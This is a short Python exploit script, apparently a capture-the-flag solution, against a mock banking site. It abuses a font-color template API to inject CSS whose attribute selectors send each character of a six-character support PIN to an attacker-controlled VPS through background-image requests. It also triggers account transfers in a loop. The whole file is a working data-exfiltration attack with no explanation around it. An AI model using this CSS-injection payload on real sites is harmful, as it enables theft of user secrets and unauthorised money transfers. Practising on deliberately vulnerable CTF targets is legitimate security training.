import time
import requests
import string

vps_host = "http://x.x.x.x:8081/"
vuln_base = "http://www.vulnbanking.co.uk/"
cookies = {'ctfchallenge': 'xxx', 'token': 'xxx'}

def injectCss(selector):
    path = "template-manager/api/set-font-color"
    requests.post(url=vuln_base + path, cookies=cookies, data= {'value': selector},proxies={'http': 'http://127.0.0.1:8080'})

def transfer():
    requests.post(url=vuln_base, cookies=cookies, data={'target_account': '2', 'amount': '1'})

def enumeratePin():
    chars = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    for c in chars:
        payload = f"""black; }} #supportModal input[name=\"pin_1\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_1={c}');}} 
            #supportModal input[name=\"pin_2\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_2={c}');}}
            #supportModal input[name=\"pin_3\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_3={c}');}}
            #supportModal input[name=\"pin_4\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_4={c}');}}
            #supportModal input[name=\"pin_5\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_5={c}');}}
            #supportModal input[name=\"pin_6\"][value=\"{c}\"] {{ background-image: url('{vps_host}?pin_6={c}');}}"""
        injectCss(payload)
        transfer()
        time.sleep(5)

enumeratePin()
